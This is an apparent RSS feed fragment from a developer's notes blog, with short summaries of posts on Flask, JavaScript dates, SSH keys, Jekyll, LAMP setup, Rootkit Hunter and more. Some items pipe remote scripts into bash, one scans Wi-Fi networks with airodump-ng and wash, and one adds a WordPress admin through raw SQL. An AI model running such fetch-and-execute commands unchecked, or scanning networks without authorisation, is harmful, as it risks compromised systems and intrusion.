      <description>Sites Using Flask  Media Queries NPR - x MailChimp  Initializing an app Default directory structure Flask Blueprints Debug (watch) mode Debug mode is also watch mode, meaning that it keeps automatically reloading the site after every save. It also provides detailed outputs in case of an error pinpointing exactly where the error happened and possible reasons as to why it happened. Debug mode is highly recommended during active development.</description>
    </item>
    
    <item>
      <title>Formatting and validating dates in JavaScript</title>
      <link>/post/_javascript/date-formatting-dates-in-javascript/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/date-formatting-dates-in-javascript/</guid>
      <description>Date Formats Dates come in multiple formats:
 a Unix timestamp (1481884441) an ISO 8601 string (2016-11-04T17:39:59.910Z) a locale string (Thursday, December 20, 2012, GMT)  Let&amp;rsquo;s get started by defining some variables to use in our examples
const UNIX = 1481884441 const ISO8601 = &#39;2016-11-04T17:39:59.910Z&#39; const invalidISO = &#39;2016-31-31T17:39:59.910Z&#39; const invalidDate = &#39;2016/31/31&#39; let date = Date.now() // Date.now() is faster than new Date()  Date.now() vs. new Date() Note that while Date.</description>
    </item>
    
    <item>
      <title>Formatting dates in JavaScript</title>
      <link>/post/_javascript/date-format-date-strings/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/date-format-date-strings/</guid>
      <description>dateObj.toLocaleTimeString([locales[, options]])   Locales (string/array of strings, optional) en-US, en-GB, ar-EG etc. Options (object, optional) where you can specify properties and their values, e.g. timeZone: &#39;Asia/Karachi&#39;  Formatting locale strings // Locale Strings let date = new Date() console.info(&#39;en-us&#39;, date.toLocaleString(&#39;en-us&#39;)) // &amp;quot;1/10/2017, 3:29:15 PM&amp;quot; console.info(&#39;en-GB&#39;, date.toLocaleString(&#39;en-GB&#39;)) // &amp;quot;10/01/2017, 15:29:15&amp;quot; console.info(&#39;ar-EG&#39;, date.toLocaleString(&#39;ar-EG&#39;)) // &amp;quot;١٠‏/١‏/٢٠١٧ ٣:٣٢:٣٣ م&amp;quot; console.info(&#39;de-DE&#39;, date.toLocaleString(&#39;de-DE&#39;)) // &amp;quot;10.1.2017, 15:32:33&amp;quot; const locale = navigator.language || navigator.userLangauge // find out the browser&#39;s locale let localeStringFormat = { weekday: &#39;long&#39;, month: &#39;long&#39;, day: &#39;numeric&#39;, year: &#39;numeric&#39; } console.</description>
    </item>
    
    <item>
      <title>Generating an SSH Key and Copying it to Remote Server</title>
      <link>/post/_linux/2014-08-26-generate_ssh_keys_copy_remote_server/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/2014-08-26-generate_ssh_keys_copy_remote_server/</guid>
      <description>mkdir ~/.ssh &amp;amp;&amp;amp; chmod 700 ~/.ssh touch ~/.ssh/authorized_keys &amp;amp;&amp;amp; chmod 600 ~/.ssh/authorized_keys # copy key.pub to authorized_keys # nano /etc/ssh/sshd_config service ssh reload  Generate the Key (on local server) cd ~/.ssh &amp;amp;&amp;amp; ssh-keygen -t rsa  Making Sure the Remote Server Accepts SSH Keys view the server&amp;rsquo;s sshd_config file
cat /etc/ssh/sshd_config  Check the following:
RSAAuthentication yes PubkeyAuthentication yes AuthorizedKeysFile ~/.ssh/authorized_keys  Making sure the .ssh folder and authorized_keys file exists on Remote server sudo mkdir ~/.</description>
    </item>
    
    <item>
      <title>Get Linux System Information</title>
      <link>/post/_sysadmin/get-linux-system-info/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/get-linux-system-info/</guid>
      <description>Routes  Use the uname command Use the /etc/*-release files Use a programming language (high-level approahc) python -mplatform Use environment variables like OSTYPE  Commands uname, hostname, machine, sw_vers are all commands you can use.
uname has a few flags (a,p,m) you can use.
cat /etc/issue : check CentOS/Ubuntu version cat /etc/os-release : get distro name 2 cat /etc/lsb-release : cat /etc/redhat-release : uname : with no arguments will name the operating system.</description>
    </item>
    
    <item>
      <title>Get raw file data from Github API</title>
      <link>/post/api/fetch-raw-files-from-github-api/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/api/fetch-raw-files-from-github-api/</guid>
      <description>You can use the send an Accept hedaer with the conent-type you want with your http requests. Many APIs allow you to request the same resource in different content-types.
// Content-Type: application/vnd.github.v3.raw http -v get https://api.github.com/gitignore/Node Accept:application/vnd.github.v3.raw  Notes  If you ask for an unsupported media/content type, you&amp;rsquo;ll get a 415: Unsupported Media Type error Response code 200s: success Response code 300s: location is elsewhere (or already in cache i.</description>
    </item>
    
    <item>
      <title>Getting WiFi details in Linux</title>
      <link>/post/_linux/wifi/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/wifi/</guid>
      <description> put wireless card in monitor mode sudo iwconfig wlan0 mode monitor &amp;amp;&amp;amp; iwconfig  via airmon
airmon-ng start wlan0  wlan0mon here is your wifi in monitor mode. To disable, run airmon-ng stop wlan0mon
get wifi details (BSSID)  iwlist scan wash -i wlan0mon --ignore-fcs airodump-ng wlan0mon  get available networks iwlist scanning  or
airodump-ng wlan0  put wifi card in monitor mode airmon-ng start wlan0  </description>
    </item>
    
    <item>
      <title>Getting started with Express</title>
      <link>/post/_javascript/2017-03-07-getting-started-express-js/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/2017-03-07-getting-started-express-js/</guid>
      <description>Initialize the project and install and save express to package.json
npm init -y npm i -S express  Here&amp;rsquo;s the code for a very basic server up and running
const express = require(&#39;express&#39;) const app = express() app.get(&#39;/&#39;, function (req, res) { res.send(&#39;Bonjour la monde!&#39;) }) const server = app.listen(3001, function () { console.info(`Server running at http://localhost:${server.address().port}`) })  install nodemon and add npm scripts to package.json
npm i -D nodemon  &amp;quot;scripts&amp;quot;: { &amp;quot;start&amp;quot;: &amp;quot;node index.</description>
    </item>
    
    <item>
      <title>Getting started with Firebase Hosting</title>
      <link>/post/_databases/2017-02-26-getting-started-firebase-hosting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_databases/2017-02-26-getting-started-firebase-hosting/</guid>
      <description>tl;dr npm i -g firebase-tools firebase login # will be redirected to Google Auth page cd /your-project-directory firebase init # initialize a project # go through the initialization options firebase deploy # deploy a site # a public URL will be provided where you can see your websites firebase open # Hosting: Deployed Site firebase use --add # setup a staging environment (add a project alias) firebase use foo # use foo environment firebase deploy # deploy changes to foo (whatever env you are in)  You can only create a project through the Firebase console.</description>
    </item>
    
    <item>
      <title>Getting started with Github Pages</title>
      <link>/post/_git-github/2015-02-19-create-publish-github-pages/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_git-github/2015-02-19-create-publish-github-pages/</guid>
      <description>There are two kinds of Github Pages. User pages and project pages.
Steps for Creating Project pages  Create a branch called gh-pages
 Add your site to it Push to github  Create a branch called gh-pages {% highlight bash %} git checkout -b gh-pages {% endhighlight %}  You&amp;rsquo;ll be doing this locally on your computer. -b is for Branch. gh-pages is the name of the branch. It MUST be gh-pages.</description>
    </item>
    
    <item>
      <title>Getting started with Jekyll</title>
      <link>/post/_jekyll/2017-02-23-getting-started-jekyll/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_jekyll/2017-02-23-getting-started-jekyll/</guid>
      <description> installation sudo gem install jekyll jekyll new my-awesome-site cd my-awesome-site jekyll serve # watches for changes by default # =&amp;gt; Now browse to http://localhost:4000  jekyll serve watches for changes by default. It serves the site locally on port 4000. To build the site for production, you can use the build command.
jekyll build --watch  configuration Links  https://jekyllrb.com/ https://jekyllrb.com/docs/configuration/  </description>
    </item>
    
    <item>
      <title>Getting started with Tmux</title>
      <link>/post/_programming/tmux/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_programming/tmux/</guid>
      <description>brew install tmux install tmux with homebrew (macOS) tmux open tmux exit or Ctrl+D to close a pane, exit tmux  tmux is controlled by a key combination of a prefix key, &amp;lsquo;C-b’ Ctrl-b by default, followed by a command key.
 ctrl+B, then ? to open a list of all key bindings ctrl+B, then % to open a new pane (horizontal) ctrl+B, then &amp;quot; (double-quote) to open a pane (vertical) ctrl+B, then arrow key (left/right/up/down) to move between panes (horizontal)  Links  Egghead.</description>
    </item>
    
    <item>
      <title>Github requests with HttPie</title>
      <link>/post/api/2017-03-07-github-httpie-requests-response/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/api/2017-03-07-github-httpie-requests-response/</guid>
      <description> Links  Egghdea.io: Understand the Basics of HTTP  </description>
    </item>
    
    <item>
      <title>Hide Menu Item/Link If User does not have Permission - OpenCart 2.1.0.2</title>
      <link>/post/_opencart/show-menu-item-only-if-permitted/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_opencart/show-menu-item-only-if-permitted/</guid>
      <description>Right now, if you edit a User Group and take away permissions for some areas, it still shows the areas in the menu. Meaning, the person can see all the areas, knows he wasn&amp;rsquo;t allowed access and get&amp;rsquo;s a not allowed message when he clicks on the menu link.
Ideally, if a user has no access to a menu, he should not see it to begin with. OpenCart should hide the menu item automatically if user doesn&amp;rsquo;t have permission to View it.</description>
    </item>
    
    <item>
      <title>Higher Order Functions</title>
      <link>/post/_programming/higher-order-functions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_programming/higher-order-functions/</guid>
      <description>Higher-order Functions - Any complicated function that was composed by combining simple functions is a higher order function. - Functions that operate on other functions, either by taking them as arguments or by returning them, are called higher-order functions. - Eloquent JavaScript - A higher-order function is a function that takes other functions as arguments and/or returns a function as it&#39;s result. - Wikipedia  Notes  Functions are values.</description>
    </item>
    
    <item>
      <title>Homebrew Commands</title>
      <link>/post/_cheatsheets/cheatsheet_homebrew-macos-package-manager-commands/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_cheatsheets/cheatsheet_homebrew-macos-package-manager-commands/</guid>
      <description>Homebrew is a package manager for MacOS, very much like apt is a package manager for Ubuntu/Debian Linux.
It lets you install, update, upgrade and uninstall programs via the command line. It also let&amp;rsquo;s you install some Linux programs for your Mac, like wget for example.
Homebrew also let&amp;rsquo;s you add programs to launchd so that they automatically start and restart with login. For example brew services start mongodb</description>
    </item>
    
    <item>
      <title>How do you disable certain package updates using APT?</title>
      <link>/post/_linux/how-do-you-disable-certain-package-updates-using-apt/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/how-do-you-disable-certain-package-updates-using-apt/</guid>
      <description> How do you disable, lock or blacklist certain package updates using apt tool in debian and ubuntu distributions.
To hold a package
sudo apt-mark hold apache2  To unhold a package
sudo apt-mark unhold apache2  Links  Tecmint: How to Disable/Lock or Blacklist Package Updates using Apt Tool  </description>
    </item>
    
    <item>
      <title>How to Install Git on CentOS</title>
      <link>/post/_linux/2015-01-18-howto-install-git-centos-6-7/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/2015-01-18-howto-install-git-centos-6-7/</guid>
      <description>The Easy Way sudo yum install git  git --version to make sure it&amp;rsquo;s installed.
Compiling from Source Make sure you have sudo access.
Install Compilation tools sudo yum groupinstall &amp;quot;Development Tools&amp;quot;  Instll Dependencies CentOS 6.x
sudo yum install zlib-devel perl-ExtUtils-MakeMaker asciidoc xmlto openssl-devel  CentOS 7.x
sudo yum install gettext-devel openssl-devel perl-CPAN perl-devel zlib-devel  Fetch source files wget https://github.com/git/git/archive/v2.2.2.tar.gz -O git.tar.gz  Check Github Release page for the latest stable version.</description>
    </item>
    
    <item>
      <title>How to add a WordPress Admin user via PhpMyAdmin</title>
      <link>/post/_databases/2015-02-12-add-create-wordpress-admin-user-phpmyadmin/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_databases/2015-02-12-add-create-wordpress-admin-user-phpmyadmin/</guid>
      <description>Why? Add support user for all hosting accounts that have wordpress installed, with one command via phpmyadmin and whm access.
{% highlight mysql %} INSERT INTO `databasename`.`wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES (&#39;9191919&#39;, &#39;username&#39;, MD5(&#39;password&#39;), &#39;Name&#39;, &#39;test@yourdomain.com&#39;, &#39;http://hostmarkaz.com/&#39;, &#39;2015-02-11 00:00:00&#39;, &#39;&#39;, &#39;0&#39;, &#39;Your Name&#39;); INSERT INTO `databasename`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, &#39;9191919&#39;, &#39;wp_capabilities&#39;, &#39;a:1:{s:13:&amp;quot;administrator&amp;quot;;s:1:&amp;quot;1&amp;quot;;}&#39;); INSERT INTO `databasename`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, &#39;9191919&#39;, &#39;wp_user_level&#39;, &#39;10&#39;); {% endhighlight %}  Fields to change: Database = databasename ID = 9191919 user_login = username user_pass = password user_nicename = Name user_email = test@yourdomain.</description>
    </item>
    
    <item>
      <title>How to convert yaml data to python data</title>
      <link>/post/_python/2014-08-29-how-to-convert-yaml-data-to-python-data/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_python/2014-08-29-how-to-convert-yaml-data-to-python-data/</guid>
      <description>This requires that you have PyYAML installed.
{% highlight bash %} sudo pip install pyyaml {% endhighlight %}  YAML file Let&amp;rsquo;s assume your YAML file is called post.yml.
{% highlight yaml %} --- layout: post author: aamnah date: 28-08-2014 slug: sample-post tags: sample, post, example categories: code {% endhighlight %}  Code: Let&amp;rsquo;s save our code in a file called convertyaml.py.
{% highlight python %} # Let&#39;s open the .</description>
    </item>
    
    <item>
      <title>How to create a Grid system in Sass</title>
      <link>/post/_css-sass/sass-grid/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_css-sass/sass-grid/</guid>
      <description>Making your own grid system is also pretty straightforward in Sass. The following example is a Sass @mixin from David Demaree’s article on A List Apart which takes one argument — $span — which will be passed into our @mixin as a variable:
{% highlight scss %} $column-width: 21em; $gutter: 1.5em; @mixin grid($span) { float: left; margin-right: $gutter; margin-bottom: $gutter; width: ($column-width * $span) + ($gutter * ($span - 1)); } {% endhighlight %}  And then later that mixin can be used with containers using simple @include:</description>
    </item>
    
    <item>
      <title>How to create a Snippet in Sublime Text</title>
      <link>/post/_workflow/2015-02-09-create-sublime-text-snippet/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_workflow/2015-02-09-create-sublime-text-snippet/</guid>
      <description>Basics  The file name should end in .subime-snippet. It should be saved in (Mac) /Users/yourname/Library/Application Support/Sublime Text 3/Packages/User See this page for the data folder on other OS. The code must ve wrapped in a &amp;lt;![CDATA[ ]]&amp;gt; tag. You can use $1 to indicate where to place the cursor after inserting the template. For example, for an HTML5 template you can place it between &amp;lt;title&amp;gt; tags like so: &amp;lt;title&amp;gt;$1&amp;lt;/title&amp;gt; and this is where the cursor will be after the snippet is inserted.</description>
    </item>
    
    <item>
      <title>How to create a man page for your Bash Script</title>
      <link>/post/bash-scripting/how_to_create_a_man_page_for_your_bash_script/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/how_to_create_a_man_page_for_your_bash_script/</guid>
      <description>  The man pages are written as nroff files. The /usr/local/man directory is the location typically used for any locally installed packages/files. You can look at examples by looking at the existing manpages, (which will likely need to be uncompressed first), also read man. Presently many users prefer groff to nroff, man groff to get started  Resources  Linux/UNIX Create a Manpage  </description>
    </item>
    
    <item>
      <title>How to import a WordPress blog in Jekyll (MacOS)</title>
      <link>/post/_jekyll/2017-02-23-howto-import-wordpress-jekyll-macos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_jekyll/2017-02-23-howto-import-wordpress-jekyll-macos/</guid>
      <description>install jekyll-import and it&amp;rsquo;s dependencies
# install homebrew if not already installed # /usr/bin/ruby -e &amp;quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&amp;quot; brew install mysql sudo gem install unidecode sequel mysql2 htmlentities hpricot open_uri_redirections sudo gem install jekyll-import  Export your WordPress site content (Dashboard &amp;gt; Tools &amp;gt; Export). Now import the downloaded file using the following command:
ruby -rubygems -e &#39;require &amp;quot;jekyll-import&amp;quot;; JekyllImport::Importers::WordpressDotCom.run({ &amp;quot;source&amp;quot; =&amp;gt; &amp;quot;/Users/aamnah/tldrdevnotes.wordpress.2017-02-23.xml&amp;quot;, })&#39;  Make sure to update the source, it should have the location of your downloaded wordpress export file.</description>
    </item>
    
    <item>
      <title>How to include files in HTML</title>
      <link>/post/_webdev/2015-02-07-how-to-include-files-in-html/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_webdev/2015-02-07-how-to-include-files-in-html/</guid>
      <description>via JavaScript a.html
{% highlight html %} &amp;lt;html&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h1&amp;gt;Put here your HTML content before insertion of b.js.&amp;lt;/h1&amp;gt; ... &amp;lt;script src=&amp;quot;b.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt; ... &amp;lt;p&amp;gt;And here whatever content you want afterwards.&amp;lt;/p&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; {% endhighlight %}  b.js:
{% highlight javascript %} document.write(&#39;\ \ &amp;lt;h1&amp;gt;Add your HTML code here&amp;lt;/h1&amp;gt;\ \ &amp;lt;p&amp;gt;Notice however, that you have to escape LF&#39;s with a &#39;\&#39;, just like\ demonstrated in this code listing.\ &amp;lt;/p&amp;gt;\ \ &#39;); {% endhighlight %}  JavaScript is preferred since jQuery is that jQuery.</description>
    </item>
    
    <item>
      <title>How to install Node.js on CentOS/cPanel</title>
      <link>/post/_linux/2015-01-19-install-nodejs-centos-cpanel/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/2015-01-19-install-nodejs-centos-cpanel/</guid>
      <description>Run as root on RHEL, CentOS or Fedora:
{% highlight bash %} curl -sL https://rpm.nodesource.com/setup | bash - {% endhighlight %}  Then install, as root:
{% highlight bash %} yum install -y nodejs {% endhighlight %}  The -y flag will automatically answer &amp;ldquo;yes&amp;rdquo; to every confirmation question, so leave it out if you want to be able to say no to something.
Optional: install build tools
To compile and install native addons from npm you may also need to install build tools:</description>
    </item>
    
    <item>
      <title>How to make websites in Urdu and use custom fonts</title>
      <link>/post/_webdev/2014-08-29-how-to-make-websites-in-urdu-and-use-custom-fonts/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_webdev/2014-08-29-how-to-make-websites-in-urdu-and-use-custom-fonts/</guid>
      <description>In this post you&amp;rsquo;ll learn how to make web pages in Urdu, how to type in Urdu, how to use custom Urdu fonts on your website and how to configure and style a website in Urdu.
Finding a font First things first, find an Urdu font that you like. I decided to use [Nafees Nastaleeq](). Other good fonts are: [Nazanin]() [Nazanin Bold]() [Farhood]()
If you are having difficulty finding good Urdu fonts (type faces), try Persian.</description>
    </item>
    
    <item>
      <title>How to parse JSON data in Python</title>
      <link>/post/_python/2015-02-22-how_to_parse_json_data_in_python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_python/2015-02-22-how_to_parse_json_data_in_python/</guid>
      <description>import urllib2 import json url = urllib2.urlopen(&amp;quot;http://portfolio.us.reuters.com/us/api/PortfolioSpy.asp?symbol=APL.KA&amp;amp;format=json&amp;quot;) data = json.load(url) print data  We need to do two steps:
 Open the URL Parse the JSON data  Open the URL To open URLs in Python we need the urllib2 module. Import the module in your script by adding import urllib2
With the .urlopen function we open the URL, which can be either a string or a Request object.</description>
    </item>
    
    <item>
      <title>How to take options for your Bash Script</title>
      <link>/post/bash-scripting/2015-02-22-how_to_take_options_for_your_bash_script/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/2015-02-22-how_to_take_options_for_your_bash_script/</guid>
      <description></description>
    </item>
    
    <item>
      <title>How to use Redcarpet for syntax highlighting in Jekyll</title>
      <link>/post/_jekyll/2017-02-23-howto-use-redcarpet-jekyll-syntax-highlighting-fenced-code/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_jekyll/2017-02-23-howto-use-redcarpet-jekyll-syntax-highlighting-fenced-code/</guid>
      <description>why? - because i don&amp;rsquo;t wanna use liquid tags. i want to keep my posts in pure markdown in case i need to switch platforms or use the posts elsewhere - because Github uses Redcarpet for rendering .md content - because it supports fenced code blocks. - because it makes working with imported/exported sites easy
install sudo gem install redcarpet  configuration In your _config.yml file, add the entry for redcarpet and update the value for markdown.</description>
    </item>
    
    <item>
      <title>Image Optimization on Linux Servers using jpegoptim and optipng</title>
      <link>/post/_sysadmin/image-optimization/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/image-optimization/</guid>
      <description>The idea is to have a script that runs periodically and compresses image files in specified directories
 Optimize images in known directories, e.g. wp-content/uploads for WordPress, image/catalog/ in OpenCart etc. Only optimize newly added files, instead of redoing the whole folder every time (on every cron run) Setup a cron so it does it on it&amp;rsquo;s own, periodically (e.g. every day)  You being the developer might be conscious of optimizing images before you upload them, but the clients usually aren&amp;rsquo;t.</description>
    </item>
    
    <item>
      <title>Image Optimization on a Linux server</title>
      <link>/post/_linux/image-optimization-on-a-linux-server/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/image-optimization-on-a-linux-server/</guid>
      <description>jpegoptim You can do a test run with the -n aka --noaction flag. It will print results without taking any action
jpegoptim -n img/  opencart directories with images  image/catalog/ catalog/view/  #!/bin/bash # optimize-images.sh install() { # Install tools if not already installed sudo apt-get install jpegoptim optipng } optimize_jpeg() { # jpegoptim -pqt --all-progressive *.jpeg # -p, --preserve, Preserve file modification times. # -q, --quiet, Quiet mode.</description>
    </item>
    
    <item>
      <title>Install MongoDB on MacOS</title>
      <link>/post/_databases/2017-03-05-install-mongodb-macos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_databases/2017-03-05-install-mongodb-macos/</guid>
      <description>tl;dr # install Homebrew if not installed already # /usr/bin/ruby -e &amp;quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&amp;quot; # install brew install mongodb # add MongoDB to startup processes brew services start mongodb # create the `/data/db` directory, where mongo data will live mkdir -p /data/db # Make sure the `/data/db` directory has the right permissions sudo chown -R `id -un` /data/db # Run the mongo daemon mongod # sudo mongod # `quit()` to quit, `ctrl+c` to exit  Using MongoDB Client CLI # start mongo client mongo mongo &amp;gt; help # see a list of commands available mongo &amp;gt; show dbs # show all databases mongo &amp;gt; use foo # use/switch to a database mongo &amp;gt; show collections # show collections (like Tables in SQL dbs) in the database mongo &amp;gt; db.</description>
    </item>
    
    <item>
      <title>Install PHP5 on Ubuntu 17.04 Zesty Zapus</title>
      <link>/post/_sysadmin/php5-ubuntu-zesty-1704/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/php5-ubuntu-zesty-1704/</guid>
      <description>(Theoretically) You can install both PHP5 and PHP7 and switch between them.. If you only want PHP5, add the repo, install the packages for PHP 5.6 and end it there.
WARNING:   This leads to PhpMyAdmin not working if you install it afterwards.. Both versions working has not been tested in production. If you check PHP version on system, php --version, it still shows PHP 7.0   add repo There are no PHP 5.</description>
    </item>
    
    <item>
      <title>Install Ruby on Ubuntu</title>
      <link>/post/_linux/2014-08-26-installing-ruby-on-ubuntu/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/2014-08-26-installing-ruby-on-ubuntu/</guid>
      <description># update packages sudo apt-get update # install curl if not already there sudo apt-get install curl -y # install RVM \curl -L https://get.rvm.io | bash -s stable # load RVM source ~/.rvm/scripts/rvm # install RVM dependencies rvm requirements # install ruby rvm install ruby # use default ruby version (latest) rvm use ruby --default # install rubygems rvm rubygems current # install Rails gem install rails  notes  the setup seems to be user specific  issues  rvm requirements needs to be run as root.</description>
    </item>
    
    <item>
      <title>Install a LAMP stack</title>
      <link>/post/_sysadmin/install-lamp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/install-lamp/</guid>
      <description>This is for a debian/ubuntu environment We&amp;rsquo;re going to install PHP at the end since it&amp;rsquo;s the longest step and has more explanations  Setup details  PHP version 7 or greater MySQL version 5.6 or greater HTTPS support  Getting ready sudo apt update &amp;amp;&amp;amp; sudo apt upgrade -y  Apache sudo apt install apache2 apache2-utils ssl-cert -y  MySQL sudo apt install mysql-server mysql-client -y  Secure the installation</description>
    </item>
    
    <item>
      <title>Install ionCube Loader on Ubuntu 16.04</title>
      <link>/post/_sysadmin/install-ioncube-loader/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/install-ioncube-loader/</guid>
      <description>wget https://downloads.ioncube.com/loader_downloads/ioncube_loaders_lin_x86-64.tar.gz # download tar xzvf ioncube_loaders_lin_x86-64.tar.gz # extract php -v # find out PHP version e.g. 7.2 php -i | grep extension_dir # find out PHP extensions directory # copy closest matching ioncube module to your PHP extensions directory sudo cp &amp;quot;ioncube/ioncube_loader_lin_7.0.so&amp;quot; /usr/lib/php/20160731/ # copy this line to top of php.ini /etc/php/7.2/apache2/php.ini # OR copy this to a new configuration file `00-ioncube.ini` and load it (by moving to /etc/php/7.</description>
    </item>
    
    <item>
      <title>Intro to Homebrew</title>
      <link>/post/_sysadmin/homebrew/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/homebrew/</guid>
      <description>Intro Home brew is a package manager for macOS, just like apt is for Debian systems and yum is for CentOS systems. The main reason people love Homebrew is because it helps in bringing some Linux utilities to macOS, wget and tree for example. It also makes managing installed packages easier.
Where you&amp;rsquo;d normally do apt install wget, Homebrew let&amp;rsquo;s you do brew install wget.
Cellar The Cellar is a place that all your kegs go.</description>
    </item>
    
    <item>
      <title>Intro to Python for newbie programmers</title>
      <link>/post/_python/2014-09-21-python-basics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_python/2014-09-21-python-basics/</guid>
      <description>video notes these notes accompany this video: A hands-on introduction to Python for beginning programmers
 You know it&amp;rsquo;s a string because of the quotes &amp;quot; &amp;quot;. You know it&amp;rsquo;s a function because of the parenthesis ( ). You know it&amp;rsquo;s a list because of the square brackets [ ].  Data Types:  Integers (1, 2, 9, 10) Floats (1.89, 2.75, 8.99) Boolean (True, False)  Comparisons:  == !</description>
    </item>
    
    <item>
      <title>Intro to Rootkit Hunter</title>
      <link>/post/_sysadmin/intro-to-rootkit-hunter/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/intro-to-rootkit-hunter/</guid>
      <description>RKHunter downloads a list of known exploits and then checks your system against the database. It also alerts you if it detects unsafe settings in some common applications.
#!/bin/bash apt update &amp;amp;&amp;amp; apt upgrade -y # Rootkit Hunter - Scan for Rootkits, backdoors and exploits EMAIL=&#39;&#39; # email for sending logs SERVER=&#39;&#39; # server name rkhunter() { wget https://downloads.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz tar xf rkhunter-1.4.4.tar.gz sudo rkhunter-1.4.4/installer.sh --install # by default it installs in /usr/local/bin (which is in $PATH) # confirm install by checking version sudo rkhunter --versioncheck # Pre-run Updates sudo rkhunter --update # update database sudo rkhunter --propupd # Before running RKH, fill the file properties database (set baseline file properties so that rkhunter can alert us if any of the essential configuration files it tracks are altered) # Scan sudo rkhunter --check # scan the entire file system # Cron touch /etc/cron.</description>
    </item>
    
    <item>
      <title>Intro to Templating with Pug (previously known as Jade)</title>
      <link>/post/_nodejs/templating-with-pug/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_nodejs/templating-with-pug/</guid>
      <description>Pug is a templating engine for Node.js Hierarchy is defined with indentation Pug let&amp;rsquo;s you use JS inside the templates. You can loop and use logic. You can also do mixins and advanced templating Pug is white-space sensitive. The pipe | character is used for whitespace control For example, if you want to start your content on a new line, it&amp;rsquo;ll treat the first word as a tag. So you use | at the beginning to avoid that.</description>
    </item>
    
    <item>
      <title>Intro to debconf</title>
      <link>/post/_sysadmin/debconf-intro/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/debconf-intro/</guid>
